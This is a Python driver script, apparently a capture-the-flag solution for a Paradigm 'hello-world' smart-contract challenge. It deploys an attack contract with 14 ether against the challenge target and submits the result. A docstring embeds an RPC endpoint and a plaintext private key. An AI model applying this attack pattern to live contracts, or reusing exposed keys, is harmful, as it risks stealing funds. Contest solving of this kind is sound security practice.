#!/usr/bin/python3
from ape import Contract, accounts, convert, networks, project
from submit import submit

from scripts.deploy import deploy

"""
rpc endpoints:
    - http://hello-world.challenges.paradigm.xyz:8545/2d52ae89-efa6-47b8-a8da-30084c3be215/main
private key:        0x0b16aa04c4cf86d33e622bc1ca741f97b2da043b45f861c00a97ac97d8d5cd6f
challenge contract: 0xCe8D2Ec712d9A9E4A19943f514601Fd9e79baB01
"""


def attack():
    if networks.active_provider.network.name != "adhoc":
        challenge, attacker = deploy()
    else:
        attacker = accounts.load("hello-world")
        attacker.set_autosign(True)
        challenge = project.Challenge.at("0xCe8D2Ec712d9A9E4A19943f514601Fd9e79baB01")

    print(attacker.balance)

    attack_contract = project.Hack.deploy(sender=attacker, value="14 ether")

    attack_contract.hack(challenge.TARGET(), sender=attacker)

    assert challenge.isSolved()

    submit()


def main():
    attack()


if __name__ == "__main__":
    main()
